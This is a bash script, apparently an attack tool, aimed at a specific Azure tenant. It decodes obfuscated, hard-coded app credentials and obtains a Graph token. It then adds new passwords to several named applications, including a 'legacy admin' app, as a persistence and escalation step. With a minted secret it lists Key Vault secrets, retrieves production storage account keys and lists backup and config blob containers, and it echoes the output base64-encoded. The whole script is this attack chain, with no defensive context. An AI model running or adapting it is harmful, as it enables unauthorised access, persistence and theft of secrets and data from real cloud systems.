#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" \
  -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "GT_LEN=${#GT}"

echo "=== ADD PASSWORD TO LEGACY ADMIN ==="
RESULT=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" \
  -H "Authorization: Bearer $GT" \
  -H "Content-Type: application/json" \
  -d "{\"passwordCredential\":{\"displayName\":\"lh-probe-$(date +%s)\"}}")
echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"

SECRET=$(echo "$RESULT" | jq -r ".secretText // empty")
if [ -z "$SECRET" ]; then
  echo "No secret returned, trying other apps"
  
  R2=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/317eef12-bc80-4c7c-9916-4b2ffcbeb15d/addPassword" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{\"passwordCredential\":{\"displayName\":\"lh-insights-$(date +%s)\"}}")
  echo "INSIGHTS_B64=$(echo "$R2" | base64 -w0)"
  
  R3=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/1f07dd31-a868-4c19-9c85-a50b9700f88f/addPassword" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{\"passwordCredential\":{\"displayName\":\"lh-dirsync-$(date +%s)\"}}")
  echo "DIRSYNC_B64=$(echo "$R3" | base64 -w0)"

  R4=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/21183692-23a7-4910-9af5-90dae73cddd5/addPassword" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{\"passwordCredential\":{\"displayName\":\"lh-cicd-$(date +%s)\"}}")
  echo "CICD_B64=$(echo "$R4" | base64 -w0)"
else
  echo "GOT SECRET len=${#SECRET}"
  
  VT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=$SECRET" \
    -d "scope=https://vault.azure.net/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "VT_LEN=${#VT}"
  
  KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $VT")
  echo "KV2_B64=$(echo "$KV2" | base64 -w0)"
  
  MT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=$SECRET" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "MT_LEN=${#MT}"
  
  echo "=== LIST KEYS ALL ==="
  curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz/listKeys?api-version=2023-01-01" \
    -H "Authorization: Bearer $MT" | jq -r ".keys[0].value // .error.code" | head -c 200
  echo ""
  
  curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" \
    -H "Authorization: Bearer $MT" | jq -r ".keys[0].value // .error.code" | head -c 200
  echo ""
  
  ST=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=$SECRET" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  
  echo "=== LIST BLOBS ==="
  curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" \
    -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" | head -c 2000
  echo ""
  curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
    -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" | head -c 2000
  echo ""
fi

echo "=== DONE ==="
